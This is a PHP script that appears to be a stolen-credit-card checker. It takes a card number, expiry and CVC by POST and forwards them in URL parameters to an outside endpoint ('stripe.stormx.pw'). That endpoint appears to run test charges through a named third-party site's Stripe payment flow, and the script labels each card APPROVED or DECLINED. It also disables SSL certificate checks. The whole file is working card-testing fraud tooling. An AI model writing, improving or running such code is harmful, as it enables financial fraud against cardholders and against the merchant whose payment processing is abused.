<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // API endpoint configuration
    $api_url = "https://stripe.stormx.pw/";
    $params = http_build_query([
        'gateway' => 'autostripe',
        'key' => 'darkboy',
        'site' => 'shebrews.org',
        'cc' => "$card_number|$exp_month|$exp_year|$cvc"
    ]);

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url . "?" . $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification if needed (insecure; use with caution)

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Prepare card details string
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        return "DECLINED [Invalid API response] $card_details";
    }

    $status = strtoupper($result['status']);
    $response_msg = $result['response'];

    // Output based on status
    if ($status === "APPROVED") {
        return "APPROVED [$response_msg] $card_details";
    } elseif ($status === "DECLINED") {
        return "DECLINED [$response_msg] $card_details";
    } else {
        return "DECLINED [Unknown status: $status] $card_details";
    }
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

$card = $_POST['card'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
$card_number = preg_replace('/[^0-9]/', '', $card['number']);
$exp_month = preg_replace('/[^0-9]/', '', $card['exp_month']);
$exp_year = preg_replace('/[^0-9]/', '', $card['exp_year']);
$cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number) ||
    !preg_match('/^\d{1,2}$/', $exp_month) ||
    !preg_match('/^\d{4}$/', $exp_year) ||
    !preg_match('/^\d{3,4}$/', $cvc)) {
    echo "DECLINED [Invalid card format]";
    exit;
}

// For parallel checking: This gateway checks one card at a time as per design.
// If multiple cards are sent in an array (future extension), handle in parallel.
// For now, check single card sequentially (instant for one).

// To simulate parallel for batches (if frontend sends multiple), but assuming single for now.
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
